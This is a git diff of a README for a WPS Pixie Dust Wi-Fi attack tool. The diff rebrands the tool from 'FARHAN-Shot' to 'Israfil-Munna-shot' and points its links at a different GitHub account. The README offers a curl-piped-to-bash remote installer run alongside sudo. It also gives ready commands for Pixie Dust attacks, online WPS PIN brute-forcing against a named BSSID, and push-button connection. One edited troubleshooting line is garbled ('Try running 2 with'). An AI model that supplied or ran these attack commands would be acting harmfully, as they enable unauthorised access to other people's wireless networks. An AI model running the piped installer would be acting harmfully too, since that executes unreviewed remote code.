@@ -8,7 +8,7 @@
 [![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)](https://termux.com/)
 
 # Overview
-**FARHAN-Shot2** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
+**Israfil-Munna-shot** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
 # Features
  - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
  - integrated [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
@@ -27,7 +27,7 @@ Please note that root access is required.
 ** and `instller` command 
 
 ```bash
-curl -sSf https://raw.githubusercontent.com/gtajisan/FARHAN-Shot_Termux_installer/master/installer.sh | bash && sudo python FARHAN-Shot/FARHAN-Shot.py -i wlan0 -K
+curl -sSf https://raw.githubusercontent.com/pantheros9/Israfil-Munna-shot_Termux_installer/master/installer.sh | bash && sudo python Israfil-Munna-shot/Israfil-Munna-shot.py -i wlan0 -K
 ```
 
 ### How to update WifiHack
@@ -36,10 +36,10 @@ To check for updates and update, `run` the following command:
 (cd Israfil-Munna-shot && git pull)
 ```
 
-# FARHAN-Shot2_Termux_installer/Link ✔
+# Israfil-Munna-shot_Termux_installer/Link ✔
 **if don't understand click here**
 
-[installer](https://github.com/Gtajisan/FARHAN-Shot_Termux_installer)
+[installer](https://github.com/pantheros9/Israfil-Munna-shot_Termux_installer)
  
 #### Manually
 **Installing requirements**
@@ -48,7 +48,7 @@ pkg update && pkg upgrade && pkg install -y root-repo && pkg install -y git tsu 
  ```
 **run farhan hack py**
  ```
- git clone --depth 1 https://github.com/gtajisan/Israfil-Munna-shot Israfil-Munna-shot
+ git clone --depth 1 https://github.com/pantheros9/Israfil-Munna-shot Israfil-Munna-shot
  ```
 
 #### Running fast command 😪?
@@ -111,40 +111,28 @@ Please note that root access is required.
 ## Usage examples
 Start Pixie Dust attack on a specified BSSID:
  ```
-cd FARHAN-Shot && sudo python3 FARHAN-Shot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
+cd Israfil-Munna-shot && sudo python3 Israfil-Munna-shot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
  ```
 Show avaliable networks and start Pixie Dust attack on a specified network:
  ```
-cd FARHAN-Shot && sudo python3 FARHAN-Shot.py -i wlan0 -K
+cd Israfil-Munna-shot && sudo python3 Israfil-Munna-shot.py -i wlan0 -K
  ```
 Launch online WPS bruteforce with the specified first half of the PIN:
  ```
-cd FARHAN-Shot && sudo python3 FARHAN-Shot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
+cd Israfil-Munna-shot && sudo python3 Israfil-Munna-shot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
  ```
  Start WPS push button connection:s
  ```
-cd FARHAN-Shot && sudo python3 FARHAN-Shot.py -i wlan0 --pbc
+cd Israfil-Munna-shot && sudo python3 Israfil-Munna-shot.py -i wlan0 --pbc
  ```
 ## Troubleshooting
 #### "RTNETLINK answers: Operation not possible due to RF-kill"
  Just run:
 ```sudo rfkill unblock wifi```
 #### "Device or resource busy (-16)"
- Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running FARHAN-Shot2 with ```--iface-down``` argument.
+ Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running Israfil-Munna-shot with ```--iface-down``` argument.
 #### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
- Try running FARHAN-Shot2 with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
-
-## CONNECT WITH US :
-
-[![Messenger](https://img.shields.io/badge/Messenger-Chat-blue?style=for-the-badge&logo=messenger)](https://m.me/j/AbZoOyGXJvl_zUrC/)
-<a href="https://github.com/Gtajisan"><img title="Github" src="https://img.shields.io/badge/FARHAN MUH TASIM-brightgreen?style=for-the-badge&logo=github"></a>
-[![Instagram](https://img.shields.io/badge/FACEBOOK-FOLLOW-red?style=for-the-badge&logo=facebook)](https://facebook.com/reyadbross)
-[![Instagram](https://img.shields.io/badge/FACEBOOK-FOLLOW-red?style=for-the-badge&logo=facebook)](https://www.facebook.com/profile.php?id=100094924471568&mibextid=gik2fB)
-[![Instagram](https://img.shields.io/badge/WHATSAPP-CHAT-red?style=for-the-badge&logo=whatsapp)](https://wa.me/+8801305057238)
-[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://www.instagram.com/gtajsan)
-[![Instagram](https://img.shields.io/badge/WEBSITE-VISIT-yellow?style=for-the-badge&logo=blogger)](https://gtajisan.github.io/Web-view/?raw=true)
-[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://t.me/farhan_muh_tasim)
-
+ Try running 2 with the `--mtk-wifi` flag to initialize Wi-Fi device driver.
 
 # Acknowledgements
 ## Special Thanks <span style='font-size:45px;'>&#128071;</span>
